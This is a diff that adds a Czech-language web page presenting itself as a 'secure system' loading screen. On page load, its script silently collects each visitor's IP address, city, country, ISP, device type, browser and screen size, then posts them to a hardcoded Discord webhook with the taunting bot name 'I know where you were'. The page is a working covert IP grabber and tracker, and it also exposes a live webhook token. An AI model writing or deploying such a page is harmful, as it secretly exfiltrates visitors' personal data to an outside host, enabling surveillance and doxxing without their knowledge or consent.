@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pokročilý Logger Webhook</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0f0f12;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 30px;
+            border-radius: 12px;
+            background: #17171c;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.7);
+            border: 1px solid #2f2f3d;
+        }
+        h1 { color: #ff4757; margin-top: 0; }
+        #status { font-weight: bold; font-size: 1.1em; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Zabezpečený Systém</h1>
+        <p id="status">Načítám síťová data a konfiguraci...</p>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1515255419314896927/UlnVGeH6fwdVVRObKzQFYNldgegZXf_GeZqb-zqjWfbeqIq9DIVj-iAULSRIMf_4CTr4";
+
+        // 1. Zjištění základních informací o zařízení
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const deviceType = isMobile ? "📱 Mobil / Tablet" : "💻 Počítač (Desktop)";
+        
+        let browserName = "Neznámý prohlížeč";
+        const ua = navigator.userAgent;
+        if (ua.includes("Firefox")) browserName = "Mozilla Firefox";
+        else if (ua.includes("Edge")) browserName = "Microsoft Edge";
+        else if (ua.includes("Chrome")) browserName = "Google Chrome";
+        else if (ua.includes("Safari")) browserName = "Apple Safari";
+
+        const screenSize = `${window.screen.width}x${window.screen.height}`;
+
+        // 2. Načtení IP adresy a lokace z externího API
+        fetch("http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,isp,query")
+        .then(res => res.json())
+        .then(geoData => {
+            
+            // Pokud API vrátilo data úspěšně, připravíme proměnné
+            const ip = geoData.query || "Neznámá";
+            const city = geoData.city || "Neznámé";
+            const country = geoData.country || "Neznámý";
+            const isp = geoData.isp || "Neznámý";
+
+            // 3. Sestavení Discord Embedu se všemi daty
+            const payload = {
+                username: "vim kde byldis 😂",
+                avatar_url: "https://i.imgur.com/R7U9WfG.png", // Ikona radaru/monitoru
+                embeds: [
+                    {
+                        title: "🚨 Zachyceno nové připojení!",
+                        description: "Došlo k přístupu na testovací lokalitu. Zde jsou kompletní síťová a hardwarová data:",
+                        color: 16729431, // Červená barva (#ff4757)
+                        fields: [
+                            {
+                                name: "🌐 IP Adresa",
+                                value: `\`${ip}\``,
+                                inline: false
+                            },
+                            {
+                                name: "📍 Lokace (Město / Stát)",
+                                value: `${city}, ${country}`,
+                                inline: true
+                            },
+                            {
+                                name: "📡 Poskytovatel (ISP)",
+                                value: isp,
+                                inline: true
+                            },
+                            {
+                                name: "💻 Zařízení",
+                                value: deviceType,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Prohlížeč",
+                                value: browserName,
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ Rozlišení",
+                                value: screenSize,
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Network Logger Core v2.0"
+                        }
+                    }
+                ]
+            };
+
+            // 4. Odeslání kompletního balíku na Discord Webhook
+            return fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        })
+        .then(response => {
+            if (response && response.ok) {
+                document.getElementById("status").innerText = "Systémová data byla úspěšně zalogována! 🛠️";
+                document.getElementById("status").style.color = "#2ed573";
+            } else {
+                document.getElementById("status").innerText = "Chyba při komunikaci s Discordem. ❌";
+                document.getElementById("status").style.color = "#ff4757";
+            }
+        })
+        .catch(error => {
+            console.error("Chyba:", error);
+            document.getElementById("status").innerText = "Nepodařilo se načíst síťová data.";
+        });
+    </script>
+
+</body>
+</html>
